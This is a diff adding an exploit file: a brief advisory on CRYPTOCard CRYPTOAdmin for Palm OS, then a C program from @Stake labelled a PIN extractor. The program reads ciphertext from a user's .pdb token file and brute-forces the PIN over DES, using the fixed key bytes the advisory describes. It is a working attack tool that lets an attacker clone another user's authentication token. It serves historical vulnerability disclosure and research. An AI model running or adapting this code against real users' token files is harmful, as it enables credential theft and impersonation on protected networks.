@@ -1,0 +1,72 @@
+source: http://www.securityfocus.com/bid/1097/info
+
+CRYPTOCard CRYPTOAdmin is a network authentication application for use with the Palm OS platform. CRYPTOAdmin generates a .pdb file which contains the username, PIN number, serial number, and key in encrypted or plaintext format. The PIN number can be retrieved due to the software's usage of a fixed 4-byte value in key generation. With access to the .pdb file and PIN number, a user is capable of duplicating the token onto another Palm device effectively gaining access to the network as the compromised user. 
+
+#include<stdio.h>
+#include<des.h>
+
+int main(int argc, char **argv)
+{
+        des_cblock in,out,key,valid = {0x63, 0x6A, 0x2A, 0x3F, 
+                                     0x25, 0x6D, 0x67, 0x6C};
+        des_key_schedule sched;
+        unsigned long massaged;
+        FILE *pdb;
+                 
+        if (argc == 1)
+        {
+                fprintf(stdout, "\nUsage: %s <.PDB filename>\n\n", argv[0]);
+        return 1;
+        }       
+
+        fprintf(stdout, "\nCRYPTOCard PT-1 PIN Extractor\n");
+        fprintf(stdout, "kingpin@atstake.com\n");
+        fprintf(stdout, "@Stake L0pht Research Labs\n");
+        fprintf(stdout, "http://www.atstake.com\n\n");
+        
+        if((pdb = fopen(argv[1], "rb")) == NULL)
+        {
+                fprintf(stderr, "Missing input file %s.\n\n", argv[1]);
+                return 1;
+        }
+        
+        fseek(pdb, 189L, SEEK_SET);
+        if (fread(in, 1, 8, pdb) != 8)
+        {
+                fprintf(stderr, "Error getting ciphertext string.\n\n");
+                return 1;
+        }
+        
+        fclose(pdb);
+                
+        key[4] = 0x24;
+        key[5] = 0x7E;
+        key[6] = 0x3E;
+        key[7] = 0x6C;
+
+        for (massaged = 0; massaged < 900000000; massaged += 9)
+        {
+                key[0]=(massaged>>24) & 0xff;
+                key[1]=(massaged>>16) & 0xff;
+                key[2]=(massaged>>8) & 0xff;
+                key[3]=(massaged) & 0xff;
+
+                des_set_key(&key,sched);
+                des_ecb_encrypt(&in,&out,sched,DES_DECRYPT);
+        
+                if (memcmp(out, valid, 8) == 0)
+                {
+                        fprintf(stdout, "\n\nPIN: %d", massaged/9);
+                break;
+                }
+
+                if ((massaged % 900000) == 0)
+                {
+                fprintf(stdout, "#");
+                fflush(stdout);
+                }
+        }
+
+        fprintf(stdout, "\n\n");
+        return 0;
+}
